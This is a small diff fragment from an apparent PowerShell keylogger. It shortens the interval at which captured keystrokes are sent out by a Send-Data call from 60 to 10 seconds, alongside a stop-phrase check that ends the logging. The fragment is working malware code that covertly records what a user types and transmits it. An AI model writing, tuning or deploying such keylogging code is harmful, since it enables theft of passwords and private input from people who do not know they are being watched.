@@ -65,7 +65,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
        if ($assoc.Length -ge 13 -and $assoc.Substring($assoc.Length -13) -eq $pattern) {
         throw "exit the keylogger"
       }
-	if ($timer.elapsed.totalseconds -gt 60) {
+	if ($timer.elapsed.totalseconds -gt 10) {
     Send-Data($assoc)
 	$timer.stop()
 	$timer = [Diagnostics.Stopwatch]::StartNew()
